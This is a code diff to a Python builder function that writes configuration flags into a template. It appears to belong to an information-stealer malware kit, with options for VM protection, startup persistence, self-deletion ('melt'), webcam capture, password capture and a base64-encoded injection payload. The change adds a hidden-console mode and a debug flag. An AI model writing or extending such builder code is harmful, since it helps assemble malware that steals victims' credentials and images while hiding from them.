@@ -21,6 +21,8 @@ def WriteSettings(code: str, settings: dict, injection: str) -> str:
     code = code.replace('%vmprotect%', "true" if settings["settings"]["vmprotect"] else "")
     code = code.replace('%startup%', "true" if settings["settings"]["startup"] else "")
     code = code.replace('%melt%', "true" if settings["settings"]["melt"] else "")
+    code = code.replace('%hideconsole%', "true" if settings["settings"]["consoleMode"] in (0, 1) else "")
+    code = code.replace('%debug%', "true" if settings["settings"]["debug"] else "")
     
     code = code.replace('%capturewebcam%', "true" if settings["modules"]["captureWebcam"] else "")
     code = code.replace('%capturepasswords%', "true" if settings["modules"]["capturePasswords"] else "")
@@ -46,9 +48,8 @@ def WriteSettings(code: str, settings: dict, injection: str) -> str:
     if injection is not None:
         code = code.replace("%injectionbase64encoded%", base64.b64encode(injection.encode()).decode())
     
-    if settings["settings"]["hideconsole"]:
-        with open("noconsole", "wb"): 
-            pass
+    if settings["settings"]["consoleMode"] == 0:
+        open("noconsole", "w").close()
     else:
         if os.path.isfile("noconsole"):
             os.remove("noconsole")
